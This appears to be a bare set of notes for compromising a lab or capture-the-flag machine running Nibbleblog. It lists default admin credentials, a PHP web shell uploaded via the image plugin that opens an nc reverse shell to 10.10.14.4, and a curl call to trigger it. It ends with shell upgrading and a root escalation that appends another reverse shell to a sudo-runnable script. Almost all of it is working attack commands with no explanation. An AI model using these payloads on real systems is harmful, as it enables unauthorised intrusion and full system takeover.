admin:nibbles

/nibbleblog/admin.php       plugins  my image 

<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.4 5678 >/tmp/f"); ?>

curl http://10.129.42.190/nibbleblog/content/private/plugins/my_image/image.php
python3 -c 'import pty; pty.spawn("/bin/bash")'

sudo -l 

echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.4 3742 >/tmp/f' | tee -a monitor.sh

sudo /home/nibbler/personal/stuff/monitor.sh
